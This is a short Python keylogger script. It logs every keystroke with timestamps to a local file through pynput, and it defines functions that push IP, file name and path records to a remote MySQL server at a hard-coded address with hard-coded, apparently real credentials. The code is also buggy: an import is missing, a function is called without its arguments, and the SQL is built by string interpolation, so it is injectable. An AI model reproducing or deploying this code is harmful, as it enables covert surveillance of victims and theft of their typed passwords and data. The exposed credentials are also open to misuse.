import pynput
import time
import string
from pynput.keyboard import Key, Listener

last_key_time = time.time()
last_line_time = time.time()

def on_press(key):
    global last_key_time, last_line_time
    current_time = time.strftime("%H:%M:%S", time.localtime())
    with open("²keylog.txt", "a") as f:
        if time.time() - last_key_time >= 5:
            f.write(f"/n{current_time} : {str(key).strip('\'')}")
            last_line_time = time.time()
        else:
            f.write(f"{str(key).strip('\'')}")
        last_key_time = time.time()

def on_release(key):
    pass

def connect_to_database():
    try:
        conn = mysql.connector.connect(
            host="46.105.155.130",
            port=3306,
            user="u1133_XDDiX8qxHl",
            password="WQ6A=fKw4Rsvf!poL2FM36fG",
            database="s1133_AdminPanel"
        )
        return conn
    except mysql.connector.Error as err:
        print("Error:", err)
        return None

def close_connection(conn):
    if conn:
        conn.close()

def data_send_to_db(ip, file_name, file_path):
    conn = connect_to_database()
    if conn:
        try:
            cursor = conn.cursor()
            cursor.execute(f'INSERT INTO files (`ip`, `filename`, `filepath`) VALUES ("{ip}", "{file_name}", "{file_path}")')
            conn.commit()
            cursor.close()
        finally:
            close_connection(conn)

current_time_to_send = time.strftime("%H:%M:%S", time.localtime())
if current_time_to_send == "23:59:59":
    data_send_to_db()
else:
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()